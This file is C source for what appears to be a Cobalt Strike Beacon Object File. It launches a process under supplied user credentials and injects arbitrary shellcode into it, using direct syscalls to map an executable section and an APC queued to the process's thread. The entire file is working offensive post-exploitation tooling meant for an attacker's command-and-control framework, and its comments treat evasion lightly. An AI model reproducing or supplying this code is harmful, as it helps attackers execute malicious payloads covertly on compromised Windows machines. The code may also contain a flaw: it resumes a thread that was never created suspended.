#include <windows.h>
#include <stdio.h>
#include "beacon.h"
#include "Syscalls.h"

WINADVAPI WINBOOL WINAPI ADVAPI32$CreateProcessWithLogonW (LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

BOOL SpawnProcess(PROCESS_INFORMATION * pInfo, LPCWSTR user, LPCWSTR domain, LPCWSTR pass, LPCWSTR exe) {
    BOOL success = FALSE;

    STARTUPINFOW sInfo={sizeof(sInfo)};
    success = ADVAPI32$CreateProcessWithLogonW (user, domain, pass, LOGON_WITH_PROFILE, exe, NULL, 0, NULL, NULL, &sInfo, pInfo); 

    if(success) {
      BeaconPrintf(CALLBACK_OUTPUT, "Spawned Process with PID: %d", pInfo->dwProcessId);
    } else {
      BeaconPrintf(CALLBACK_ERROR, "Failed to spawn process.");
    }
    return success;
}

VOID InjectShellcode(PROCESS_INFORMATION * pInfo, char* sc_ptr, SIZE_T sc_len) {
    HANDLE            scHandle = NULL;
    NTSTATUS          nts;
    LARGE_INTEGER     li;
    PVOID scSection = NULL, injectedBaseAddress = NULL;
   	SIZE_T viewSize = 0;

    li.HighPart = 0;
    li.LowPart = sc_len;

    sc_len++;

    // Allocating Read-Write-eXecute (RWX) memory for shellcode (opsec 101)    
    if (nts = NtCreateSection(&scHandle, SECTION_ALL_ACCESS, NULL, &li,
		PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) != STATUS_SUCCESS) {
          BeaconPrintf(CALLBACK_ERROR,"NtCreateSection - FAILED! %08X\n", nts);
          return;
        }

    // Map view in current process
    if (nts = NtMapViewOfSection(scHandle, NtCurrentProcess(), &scSection, 
      0, 0, NULL, &viewSize, 1, 0, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS){
        BeaconPrintf(CALLBACK_ERROR,"NtMapViewOfSection - FAILED! %08X\n", nts);
        NtClose(scHandle);
        return;
      }

    // Copy shellcode into this mapped section
    MSVCRT$memcpy(scSection, sc_ptr, sc_len);
    
    // Map view in remote process
    if (nts = NtMapViewOfSection(scHandle, pInfo->hProcess, &injectedBaseAddress, 0,
    0, 0, &viewSize, 1, 0, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"NtMapViewOfSection2 - FAILED! %08X\n", nts);
        NtClose(scHandle);
        return;
      }

    // Unmap view with shellcode now written to remote process
    if (nts = NtUnmapViewOfSection(NtCurrentProcess(), scSection) != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"NtUnmapViewOfSection - FAILED! %08X\n", nts);
        NtClose(scHandle);
        return;
      }

    NtClose(scHandle);
  
    // Queue APC
    if (nts = NtQueueApcThread(pInfo->hThread, injectedBaseAddress, 0, NULL, NULL) != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,"NtQueueApcThread - FAILED! %08X\n", nts);
        return;
      }
    
    // Resume suspended process with thread executing
    if (nts = NtResumeThread(pInfo->hThread, NULL) != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR,"NtResumeThread - FAILED! %08X\n", nts);
      return;
    }

    // Head back to base for debriefing and cocktails
    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode injection completed successfully!");   
}

void go(char *args, int len) {
    char* sc_ptr;
    LPCWSTR domain;
    LPCWSTR user;
    LPCWSTR pass;
    LPCWSTR exe;
    SIZE_T sc_len; 
    datap parser;
    PROCESS_INFORMATION processInformation;

    BeaconDataParse(&parser, args, len);
    sc_len = BeaconDataLength(&parser);
    sc_ptr = BeaconDataExtract(&parser, NULL);
    domain = (wchar_t*)BeaconDataExtract(&parser, NULL);
    user   = (wchar_t*)BeaconDataExtract(&parser, NULL);
    pass   = (wchar_t*)BeaconDataExtract(&parser, NULL);
    exe    = (wchar_t*)BeaconDataExtract(&parser, NULL);
	
    if(SpawnProcess(&processInformation, user, domain, pass, exe)){
      InjectShellcode(&processInformation, sc_ptr, sc_len);
      BeaconCleanupProcess(&processInformation);
    } else {
      BeaconPrintf(CALLBACK_ERROR, "Failed to spawn process. Exiting...");
    }
}
